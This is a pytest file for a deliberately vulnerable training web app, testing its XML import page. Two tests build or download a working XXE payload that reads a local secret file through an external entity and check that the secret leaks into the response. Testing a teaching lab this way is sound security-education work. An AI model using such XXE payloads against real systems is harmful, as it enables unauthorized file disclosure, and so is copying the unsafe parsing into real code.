import io


def _upload(client, xml_text, filename="payload.xml"):
    return client.post(
        "/a03/xml-import",
        data={"xml_file": (io.BytesIO(xml_text.encode()), filename)},
        content_type="multipart/form-data",
    )


def test_xml_import_parses_legitimate_contact(client):
    response = _upload(client, "<contact><name>Alice</name></contact>")
    assert response.status_code == 200
    assert b"Alice" in response.data


def test_xml_import_xxe_discloses_secret_file(client):
    import os

    secret_path = os.path.join(
        os.path.dirname(os.path.dirname(__file__)),
        "app", "categories", "a03_injection", "xxe_secret.txt",
    )
    payload = (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE contact [<!ENTITY xxe SYSTEM "file://{secret_path}">]>'
        '<contact><name>&xxe;</name></contact>'
    )
    response = _upload(client, payload)
    assert response.status_code == 200
    assert b"xK9-vault-passphrase-2024" in response.data


def test_xml_import_still_works_with_teaching_text_hidden(app, client):
    from app.core.models import Settings
    from app.extensions import db

    with app.app_context():
        settings = Settings.get()
        settings.show_explanations = False
        settings.show_exploit_instructions = False
        db.session.commit()

    response = _upload(client, "<contact><name>Alice</name></contact>")
    assert response.status_code == 200
    assert b"Alice" in response.data
    assert b"Vulnerable vs. Secure" in response.data
    assert b"Detect" not in response.data


def test_xml_import_link_appears_in_overview_once_registered(client):
    response = client.get("/a03/")
    assert response.status_code == 200
    assert b"XXE File Disclosure" in response.data
    assert b'href="/a03/xml-import"' in response.data


def test_xml_import_demo_payload_download_discloses_secret_when_uploaded(client):
    # The downloadable demo payload must be a genuinely working exploit --
    # download it, then upload it right back in and confirm it discloses
    # the same secret the manual payload does.
    download = client.get("/a03/xml-import/demo-payload.xml")
    assert download.status_code == 200
    assert "attachment" in download.headers.get("Content-Disposition", "")
    assert b"<!ENTITY xxe SYSTEM" in download.data
    assert b"xxe_secret.txt" in download.data  # the resolved secret path is embedded

    response = _upload(client, download.data.decode(), filename="xxe-file-disclosure-demo.xml")
    assert response.status_code == 200
    assert b"xK9-vault-passphrase-2024" in response.data
